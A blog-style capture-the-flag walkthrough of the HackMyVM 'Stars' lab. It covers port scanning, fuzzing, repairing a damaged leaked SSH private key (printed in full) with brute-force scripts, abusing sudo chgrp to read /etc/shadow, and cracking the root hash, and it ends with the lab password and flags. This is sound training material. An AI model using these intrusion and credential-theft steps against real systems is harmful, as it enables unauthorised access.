---
layout: post
author: canarinho
title:  "Stars"
date:   2021-12-31 09:52:10 AM -03
category: HackMyVM
tags: Writeup
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Stars)

## Scannning and Fuzzing

{% highlight bash  %}
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2021-12-28 13:30 -03
Nmap scan report for debian (192.168.15.96)
Host is up (0.0040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
|_  256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Cours PHP & MySQL
|_http-server-header: Apache/2.4.51 (Debian)
MAC Address: 08:00:27:00:E5:67 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 7.32 seconds
{% endhighlight %}

The cookie show us the file we looking for: poisonedgift.txt.

Accessing it, we found this private key:

{% highlight text %}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
{% endhighlight %}

{% highlight bash  %}
ffuf -u <http://192.168.15.96/FUZZ.txt> -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30

	sshnote                 [Status: 200, Size: 117, Words: 22, Lines: 5]
{% endhighlight %}

[http://192.168.15.96/sshnote.txt](http://192.168.15.96/sshnote.txt)

{% highlight text %}
My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
Can you try to fix it?

sophie
{% endhighlight %}

## Getting ssh access, thank you

{% highlight bash  %}
#!/bin/bash

directory=keys
letters=dic.txt
file=id_rsa

mkdir $directory

for i in $(cat $letters); do
	echo generate $directory\\\\$i.rsa [$i]
	sed "s/\\*\\*\\*/$i/" $file > $directory/$i.rsa
done;
{% endhighlight %}

{% highlight bash  %}
#!/bin/bash

directory=keys
letters=dic.txt

chmod 600 $directory/*

for i in $(ls -1 $directory/*); do
	echo $i
	ssh sophie@192.168.15.96 -i $i 2>/dev/null
done;
{% endhighlight %}

The right letters is BOM. So... BOOOM ehehe

{% highlight text %}
user.txt 	->	a99ac9055a3e60a8166cdfd746511852
{% endhighlight %}

## Privesc

{% highlight bash  %}
sophie@debian:~$ sudo -l
User sophie may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/chgrp

sophie@debian:~$ sudo /usr/bin/chgrp sophie /etc/shadow
sophie@debian:~$ cat /etc/shadow
root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
{% endhighlight %}

{% highlight bash  %}
john passroot --wordlist=/usr/share/wordlists/rockyou.txt
barbarita        (?)
{% endhighlight %}

Now, just access login as root and pow bow tchau.

{% highlight text %}
root.txt 	->	bf3b0ba0d7ebf3a1bf6f2c452510aea2
{% endhighlight %}